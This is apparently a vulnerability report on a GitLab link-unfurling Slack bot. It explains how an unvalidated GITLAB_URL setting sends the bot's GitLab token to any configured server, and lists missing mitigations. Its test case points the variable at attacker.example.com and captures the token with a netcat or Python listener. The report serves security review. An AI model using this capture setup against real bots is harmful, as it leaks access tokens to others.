### Vulnerability List

- Vulnerability Name: GITLAB_URL SSRF due to lack of validation
- Description:
    1. An attacker (or misconfiguration) sets the `GITLAB_URL` environment variable to point to a malicious server instead of a legitimate GitLab instance.
    2. A user in Slack posts a GitLab URL in a channel where the bot is active.
    3. The Slack bot parses the GitLab URL and attempts to fetch information to unfurl the link.
    4. The bot constructs an API request using the `GITLAB_URL` as the base URL and sends this request to the server specified in `GITLAB_URL`.
    5. Because `GITLAB_URL` is pointing to a malicious server, the API request, including the `PRIVATE-TOKEN` in the header, is sent to the attacker-controlled server.
    6. The attacker's server can capture the `GITLAB_TOKEN` from the request headers.
- Impact:
    - Leakage of the `GITLAB_TOKEN`.
    - An attacker can gain unauthorized access to the legitimate GitLab instance using the leaked `GITLAB_TOKEN`, potentially allowing them to read sensitive data, modify projects, or perform other actions depending on the token's permissions.
- Vulnerability Rank: High
- Currently implemented mitigations:
    - None. The application does not validate or sanitize the `GITLAB_URL` environment variable.
- Missing mitigations:
    - Input validation for `GITLAB_URL`. The application should validate that `GITLAB_URL` is a valid and expected GitLab instance URL.
    - Implement a whitelist of allowed GitLab domains or URL patterns for `GITLAB_URL`.
    - Consider validating the response from the `GITLAB_URL` to ensure it is indeed a GitLab instance before sending sensitive tokens.
- Preconditions:
    - The `GITLAB_URL` environment variable of the deployed Slack bot must be set to a malicious URL. This could occur due to:
        - Misconfiguration by the user deploying the bot.
        - An attacker gaining access to the deployment environment and modifying the environment variables.
- Source code analysis:
    1. File: `/code/unfurl_message.py`
    2. Line 31: `GITLAB_URL = os.getenv("GITLAB_URL")` - The `GITLAB_URL` is read directly from the environment without any validation.
    3. Line 89: `def get_data_from_api(session, api_path):` - This function constructs the full API URL using `urljoin(GITLAB_URL, api_path)`.
    4. Line 90: `response = session.get(urljoin(GITLAB_URL, api_path))` - The request is made to the constructed URL.
    5. The `GITLAB_TOKEN` is included in the headers for all API requests made by `get_data_from_api` via the `session` object which is initialized in `unfurl` function with `session.headers = {"PRIVATE-TOKEN": GITLAB_TOKEN, "User-Agent": "GitLab Unfurly"}`.
    6. There is no code to validate the `GITLAB_URL` to ensure it points to a legitimate GitLab instance.
    7. Visualization:
        ```
        [Slack User] --> (Post GitLab URL in Slack) --> [Slack Bot]
                       [Slack Bot] --> (Construct API Request using GITLAB_URL + API Path, includes GITLAB_TOKEN in header) --> [Attacker Server (if GITLAB_URL is malicious)]
                       [Attacker Server] --> (Capture GITLAB_TOKEN from request header)
        ```
- Security test case:
    1. **Setup Attacker Server:**
        - Prepare an attacker-controlled server (e.g., using `python -m http.server 8000` or `nc -l 8000`) that logs incoming HTTP requests. Let's assume it's reachable at `http://attacker.example.com:8000`.
    2. **Deploy the Slack Bot with Misconfigured GITLAB_URL:**
        - Deploy the `gitlab-unfurly` bot to AWS Lambda or a similar serverless environment.
        - **Crucially, set the `GITLAB_URL` environment variable to `http://attacker.example.com:8000`**.
        - Configure other necessary environment variables (`SLACK_TOKEN`, `GITLAB_TOKEN` - the `GITLAB_TOKEN` can be a dummy token for a test GitLab instance to minimize risk, but ensure it's set so the code doesn't error out early).
        - Ensure the bot is connected to a test Slack workspace.
    3. **Trigger Unfurl:**
        - In the test Slack workspace, in a channel where the bot is active, post a valid-looking GitLab URL (the actual GitLab instance in this URL doesn't matter as the bot will use the misconfigured `GITLAB_URL`). For example: `https://gitlab.com/testgroup/testproject/issues/1`.
    4. **Observe Attacker Server Logs:**
        - Check the logs of the attacker-controlled server (`http://attacker.example.com:8000`).
        - Verify that a request was received by the attacker server.
        - **Critically, verify that the received request includes the `PRIVATE-TOKEN` header, which contains the `GITLAB_TOKEN` value you configured (or the dummy token).**
    5. **Verification of Vulnerability:**
        - If the attacker server successfully captured the request with the `PRIVATE-TOKEN` header, it confirms the SSRF vulnerability due to the lack of `GITLAB_URL` validation. An attacker who can control the `GITLAB_URL` environment variable can indeed steal the `GITLAB_TOKEN`.